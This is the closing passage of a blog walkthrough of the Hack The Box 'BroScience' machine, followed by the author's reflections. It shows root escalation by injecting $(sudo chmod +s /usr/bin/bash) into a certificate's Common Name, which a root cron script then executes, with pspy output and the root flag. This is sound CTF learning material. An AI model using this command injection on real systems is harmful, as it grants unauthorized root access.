</span></span><span class=line><span class=cl>Locality Name <span class=o>(</span>eg, city<span class=o>)</span> <span class=o>[]</span>:
</span></span><span class=line><span class=cl>Organization Name <span class=o>(</span>eg, company<span class=o>)</span> <span class=o>[</span>Internet Widgits Pty Ltd<span class=o>]</span>:
</span></span><span class=line><span class=cl>Organizational Unit Name <span class=o>(</span>eg, section<span class=o>)</span> <span class=o>[]</span>:
</span></span><span class=line><span class=cl>Common Name <span class=o>(</span>e.g. server FQDN or YOUR name<span class=o>)</span> <span class=o>[]</span>:<span class=k>$(</span>id<span class=k>)</span>
</span></span><span class=line><span class=cl>Email Address <span class=o>[]</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$/bin/bash renew_cert.sh /tmp/temp.crt 
</span></span><span class=line><span class=cl><span class=nv>C</span> <span class=o>=</span> AU, <span class=nv>ST</span> <span class=o>=</span> Some-State, <span class=nv>O</span> <span class=o>=</span> Internet Widgits Pty Ltd, <span class=nv>CN</span> <span class=o>=</span> <span class=k>$(</span>id<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>Country</span>     <span class=o>=</span>&gt; AU
</span></span><span class=line><span class=cl><span class=nv>State</span>       <span class=o>=</span>&gt; Some-State
</span></span><span class=line><span class=cl><span class=nv>Locality</span>    <span class=o>=</span>&gt; 
</span></span><span class=line><span class=cl>Org <span class=nv>Name</span>    <span class=o>=</span>&gt; Internet Widgits Pty Ltd
</span></span><span class=line><span class=cl>Org <span class=nv>Unit</span>    <span class=o>=</span>&gt; 
</span></span><span class=line><span class=cl>Common <span class=nv>Name</span> <span class=o>=</span>&gt; <span class=k>$(</span>id<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>Email</span>       <span class=o>=</span>&gt; 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Generating certificate...
</span></span><span class=line><span class=cl>mv: target <span class=s1>&#39;groups=1003(zara),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),119(bluetooth),128(vboxsf),1000(lpadmin),1001(scanner),1002(docker).crt&#39;</span> is not a directory
</span></span></code></pre></td></tr></table></div></div><p>So, we can command inject into this line of the recurring script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/bash -c <span class=s2>&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span class=nv>$commonName</span><span class=s2>.crt&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Rather than having to create another reverse shell, I just set uid on <code>/usr/bin/bash</code> and ran it as root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out broscience.crt -days <span class=m>1</span>
</span></span><span class=line><span class=cl>Generating a RSA private key
</span></span><span class=line><span class=cl>................................................................................................................................................................................................................................................................................++++
</span></span><span class=line><span class=cl>.......................................................................................................................................++++
</span></span><span class=line><span class=cl>writing new private key to <span class=s1>&#39;broscience.key&#39;</span>
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>You are about to be asked to enter information that will be incorporated
</span></span><span class=line><span class=cl>into your certificate request.
</span></span><span class=line><span class=cl>What you are about to enter is what is called a Distinguished Name or a DN.
</span></span><span class=line><span class=cl>There are quite a few fields but you can leave some blank
</span></span><span class=line><span class=cl>For some fields there will be a default value,
</span></span><span class=line><span class=cl>If you enter <span class=s1>&#39;.&#39;</span>, the field will be left blank.
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>Country Name <span class=o>(</span><span class=m>2</span> letter code<span class=o>)</span> <span class=o>[</span>AU<span class=o>]</span>:
</span></span><span class=line><span class=cl>State or Province Name <span class=o>(</span>full name<span class=o>)</span> <span class=o>[</span>Some-State<span class=o>]</span>:
</span></span><span class=line><span class=cl>Locality Name <span class=o>(</span>eg, city<span class=o>)</span> <span class=o>[]</span>:
</span></span><span class=line><span class=cl>Organization Name <span class=o>(</span>eg, company<span class=o>)</span> <span class=o>[</span>Internet Widgits Pty Ltd<span class=o>]</span>:
</span></span><span class=line><span class=cl>Organizational Unit Name <span class=o>(</span>eg, section<span class=o>)</span> <span class=o>[]</span>:
</span></span><span class=line><span class=cl>Common Name <span class=o>(</span>e.g. server FQDN or YOUR name<span class=o>)</span> <span class=o>[]</span>:<span class=k>$(</span>sudo chmod +s /usr/bin/bash<span class=k>)</span>
</span></span><span class=line><span class=cl>Email Address <span class=o>[]</span>:
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s create our cert on the machine now with the above command injection, and see if we get a new SUID copy of bash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-5.1$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days <span class=m>1</span>
</span></span><span class=line><span class=cl>Generating a RSA private key
</span></span><span class=line><span class=cl>......................................................................................++++
</span></span><span class=line><span class=cl>....................................................................................................................................++++
</span></span><span class=line><span class=cl>writing new private key to <span class=s1>&#39;/home/bill/Certs/broscience.key&#39;</span>
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>You are about to be asked to enter information that will be incorporated
</span></span><span class=line><span class=cl>into your certificate request.
</span></span><span class=line><span class=cl>What you are about to enter is what is called a Distinguished Name or a DN.
</span></span><span class=line><span class=cl>There are quite a few fields but you can leave some blank
</span></span><span class=line><span class=cl>For some fields there will be a default value,
</span></span><span class=line><span class=cl>If you enter <span class=s1>&#39;.&#39;</span>, the field will be left blank.
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>Country Name <span class=o>(</span><span class=m>2</span> letter code<span class=o>)</span> <span class=o>[</span>AU<span class=o>]</span>:
</span></span><span class=line><span class=cl>State or Province Name <span class=o>(</span>full name<span class=o>)</span> <span class=o>[</span>Some-State<span class=o>]</span>:
</span></span><span class=line><span class=cl>Locality Name <span class=o>(</span>eg, city<span class=o>)</span> <span class=o>[]</span>:
</span></span><span class=line><span class=cl>Organization Name <span class=o>(</span>eg, company<span class=o>)</span> <span class=o>[</span>Internet Widgits Pty Ltd<span class=o>]</span>:
</span></span><span class=line><span class=cl>Organizational Unit Name <span class=o>(</span>eg, section<span class=o>)</span> <span class=o>[]</span>:
</span></span><span class=line><span class=cl>Common Name <span class=o>(</span>e.g. server FQDN or YOUR name<span class=o>)</span> <span class=o>[]</span>:<span class=k>$(</span>sudo chmod +s /usr/bin/bash<span class=k>)</span>
</span></span><span class=line><span class=cl>Email Address <span class=o>[]</span>:
</span></span></code></pre></td></tr></table></div></div><p>We see the following in pspy &ndash; our command to add the SetUID bit to bash running as UID=0 (root):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2023/01/29 04:10:03 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>     <span class=nv>PID</span><span class=o>=</span><span class=m>106162</span> <span class=p>|</span> /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
</span></span><span class=line><span class=cl>2023/01/29 04:10:03 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>     <span class=nv>PID</span><span class=o>=</span><span class=m>106163</span> <span class=p>|</span> sudo chmod +s /usr/bin/bash 
</span></span></code></pre></td></tr></table></div></div><p>And it looks like we can now run bash while maintaining elevated privileges &ndash; which means we get the root flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-5.1$ /usr/bin/bash -p
</span></span><span class=line><span class=cl>bash-5.1# id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>bill<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>bill<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>bill<span class=o>)</span>
</span></span><span class=line><span class=cl>bash-5.1# cat /root/root.txt 
</span></span><span class=line><span class=cl>8d5e0e3f4363a6658c468f128532b915
</span></span></code></pre></td></tr></table></div></div><h2 id=conclusion>Conclusion</h2><p>Initial LFI and filter bypass was fairly obvious when enumerating given the &lsquo;Error: attack detected&rsquo; error messages the web server was returning. I definitely lost a reasonable amount of time trying to work out how to register and activate a user, and somehow overlooked the <code>srand(time());</code> call to seed randomness from the current time &ndash; a new attack I had not encountered until now in CTFs. Additionally, PHP object injection was entirely new to me, and I misunderstood the serialisation/deserialisation process until I played with the relevant code locally. With RCE out of the way, escalating to the bill user account was easy, and the subsequent escalation to root was also fairly straight forward once I again played with the vulnerable script locally and crafted a payload.</p><p>A fun machine where the path was not too unclear and I avoided rabbit holes, but learnt to slow down and understand concepts first. Playing with vulnerable scripts and replicating bugs/attacks locally is hugely beneficial in this regard.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-04-08&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/396d2726a93d40ffbea92253760a55d8067ff7f5 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) 396d2726a93d40ffbea92253760a55d8067ff7f5: fix tags syntax error">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>396d272</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-04-08-broscience-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-04-08-broscience-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-04-08-broscience-htb/ data-title="BroScience HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-04-08-broscience-htb/ data-title="BroScience HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on " data-sharer=weibo data-url=https://emdwyer.github.io/2023-04-08-broscience-htb/ data-title="BroScience HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/php/>php</a>,&nbsp;<a href=/tags/deserialization/>deserialization</a>,&nbsp;<a href=/tags/injection/>injection</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-03-11-mentor/ class=prev rel=prev title="Mentor HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Mentor HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>